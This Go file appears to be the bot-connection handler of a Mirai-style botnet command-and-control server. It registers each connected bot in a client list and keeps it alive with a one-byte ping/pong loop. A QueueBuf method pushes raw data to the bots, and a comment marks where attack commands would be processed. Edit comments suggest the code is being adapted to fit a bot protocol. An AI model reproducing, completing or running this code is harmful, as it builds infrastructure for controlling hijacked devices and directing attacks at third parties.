package main

import (
    "fmt"
    "net"
    "time"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}

func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 1)  // Changed to 1 byte to match bot protocol
    pingCount := 0
    
    for {
        // Increase timeout to 5 minutes
        this.conn.SetDeadline(time.Now().Add(300 * time.Second))
        
        // Read ping from bot (1 byte)
        n, err := this.conn.Read(buf)
        if err != nil {
            fmt.Printf("Bot ping read failed: %v (bytes: %d) - Connection: %s\n", err, n, this.conn.RemoteAddr())
            return
        }
        if n != 1 {
            fmt.Printf("Bot ping read incomplete: expected 1 byte, got %d - Connection: %s\n", n, this.conn.RemoteAddr())
            return
        }
        
        pingCount++
        if pingCount%100 == 0 {  // Log every 100th ping to avoid spam
            fmt.Printf("Bot ping #%d successful from %s (source: %s)\n", pingCount, this.conn.RemoteAddr(), this.source)
        }
        
        // Send pong back to bot (echo the same byte)
        n, err = this.conn.Write(buf)
        if err != nil {
            fmt.Printf("Bot pong write failed: %v (bytes: %d) - Connection: %s\n", err, n, this.conn.RemoteAddr())
            return
        }
        if n != 1 {
            fmt.Printf("Bot pong write incomplete: expected 1 byte, sent %d - Connection: %s\n", n, this.conn.RemoteAddr())
            return
        }
        
        // Optional: Process any commands here
        // This is where attack commands would be processed
    }
}

func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf)
}
